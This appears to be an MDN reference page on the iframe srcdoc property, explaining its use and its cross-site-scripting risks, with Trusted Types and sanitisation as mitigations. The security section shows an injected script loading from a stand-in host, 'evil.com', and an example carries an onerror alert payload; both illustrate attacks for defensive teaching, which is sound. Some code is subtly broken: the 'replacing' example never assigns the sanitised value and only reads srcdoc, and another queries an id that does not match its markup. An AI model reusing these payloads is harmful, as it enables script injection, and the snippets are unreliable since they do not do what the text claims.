---
title: "HTMLIFrameElement: srcdoc property"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
page-type: web-api-instance-property
browser-compat: api.HTMLIFrameElement.srcdoc
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> This property parses its input as HTML, writing the result into the frame's DOM.
> APIs like this are known as [injection sinks](/en-US/docs/Web/API/Trusted_Types_API#concepts_and_usage), and are potentially a vector for [cross-site-scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks, if the input originally came from an attacker.
>
> You can mitigate this risk by always assigning `TrustedHTML` objects instead of strings and [enforcing trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> See [Security considerations](#security_considerations) for more information.

The **`srcdoc`** property of the {{domxref("HTMLIFrameElement")}} interface gets or sets the inline HTML markup of the frame's document.

This reflects the [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) attribute of the {{htmlelement("iframe")}}.

## Value

Getting the property returns a string containing the HTML serialization of the frame's document.
This is `undefined` if the value is not set.

Setting the property accepts either a {{domxref("TrustedHTML")}} object or a string.
It parses this input as a HTML document and replaces the content of the frame with the result.

### Exceptions

- `TypeError`
  - : Thrown if the property is set to a string when [Trusted Types](/en-US/docs/Web/API/Trusted_Types_API) are [enforced by a CSP](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) and no default policy is defined.

## Description

The **`srcdoc`** property reflects the content of the `<iframe>` element's [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) attribute, and can be used to set or get the HTML document belonging to the {{htmlelement("iframe")}}.

When setting the property the input should define a valid HTML document, including the {{glossary("doctype","doctype directive")}}, {{htmlelement("html")}}, {{htmlelement("body")}}, and other tags.
Note though, that browsers are usually tolerant of invalid markup, and most should attempt to render input that contains only body content.

Any markup supported by the browser will be parsed/serialized, including {{glossary("shadow tree", "Shadow roots")}}.

Note that if this is set, it will override any value set in the {{domxref("HTMLIFrameElement.src", "src")}} property.

### Security considerations

The `srcdoc` property allows absolutely any HTML markup to run in a frame by default.
If the frame is not sandboxed using the Content Security Property (CSP) [`sandbox` directive](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) (or is sandboxed but includes the [`allow-same-origin`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) value) then it will be same-origin with the parent.
This means that the frame will have complete access to the parent DOM and resources, and visa versa.

This is a significant vector for [Cross-site-scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks if potentially unsafe strings provided by a user are injected into a frame without first being sanitized.
Consider the following code where a string of HTML from a user might be passed into a frame that is then added to the document.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

If the frame is not expected to need access to your parent document, you can significantly mitigate the risk by using a CSP sandbox without the `allow-same-origin` value.
The frame will then be treated as a cross-origin resource, and attacks will be significantly restricted.
You can also use a more general CSP to restrict the locations from which scripts and other resources are allowed to be fetched.

You can further reduce the risk by always assigning {{domxref("TrustedHTML")}} objects instead of strings, and [enforcing trusted type](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) using the [`require-trusted-types-for`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP directive.
This ensures that the input is passed through a transformation function, which has the chance to [sanitize](/en-US/docs/Web/Security/Attacks/XSS#sanitization) the input to remove potentially dangerous markup before it is injected.

## Examples

### Reading the HTML from a frame

Reading `srcdoc` causes the user agent to serialize the frame's document.

Given the following HTML:

```html
<frame
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></frame>
```

You can get and log the markup as shown:

```js
const frame = document.querySelector("#frame");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Replacing the frame inline source

In this example we'll replace a frame's document by assigning HTML to its `srcdoc` property.
To mitigate the risk of XSS, we'll first create a `TrustedHTML` object from the string containing the HTML, and then assign that object to `srcdoc`.

Trusted types are not yet supported on all browsers, so first we define the [trusted types tinyfill](/en-US/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
This acts as a transparent replacement for the Trusted Types JavaScript API:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Next we create a {{domxref("TrustedTypePolicy")}} that defines a {{domxref("TrustedTypePolicy/createHTML", "createHTML()")}} for transforming an input string into {{domxref("TrustedHTML")}} instances.
Commonly, implementations of `createHTML()` use a library such as [DOMPurify](https://github.com/cure53/DOMPurify) to sanitize the input, as shown below:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Then we use this `policy` object to create a `TrustedHTML` object from the potentially unsafe input string, and assign the result to the element:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#frame");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> While you can directly assign a string to `srcdoc`, this is a [security risk](#security_considerations) if the string to be inserted might contain potentially malicious content.
> You should use `TrustedHTML` to ensure that the content is sanitized before it is inserted, and you should set a CSP header to [enforce trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Specifications

{{Specifications}}

## Browser compatibility

{{Compat}}
